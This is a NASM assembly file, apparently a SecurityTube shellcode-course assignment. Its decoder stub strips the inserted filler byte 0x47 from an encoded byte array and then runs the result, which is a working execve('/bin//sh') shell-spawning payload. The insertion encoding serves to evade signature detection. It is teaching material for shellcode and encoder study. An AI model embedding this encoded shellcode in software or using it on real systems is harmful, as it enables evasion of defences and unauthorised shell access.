; Filename: Assignment_4.nasm
; Author:  Vivek Ramachandran
; Co-Author jmm
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: TBD

global _start			

section .text
_start:

	jmp short call_shellcode ; We use jmp short hit the call_shellcode sequence

decoder: ; This sets up the Insertion encoded shellcode into memory
	pop esi
	lea edi, [esi +1]
	xor eax, eax
	mov al, 1
	xor ebx, ebx

decode: ; The decode loop removes the Inserted bytes from the InsertionShellcode two bytes at a time. The jnz remains in effect until it reaches the "random" bytes at the end, which will NOT zero out the bl register (because it is not the insertion byte 0x47). 
	mov bl, byte [esi + eax]
	xor bl, 0x47
	jnz short InsertionShellcode
	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode

call_shellcode:

	call decoder ; begin the decoder sequence. 
	; Note at the end of the insertion shellcode are two addition bytes used to break the jnz in the decode loop.
	InsertionShellcode: db 0x31,0x47,0xc0,0x47,0x50,0x47,0x68,0x47,0x2f,0x47,0x2f,0x47,0x73,0x47,0x68,0x47,0x68,0x47,0x2f,0x47,0x62,0x47,0x69,0x47,0x6e,0x47,0x89,0x47,0xe3,0x47,0x50,0x47,0x89,0x47,0xe2,0x47,0x53,0x47,0x89,0x47,0xe1,0x47,0xb0,0x47,0x0b,0x47,0xcd,0x47,0x80,0x47, 0x74,0x74
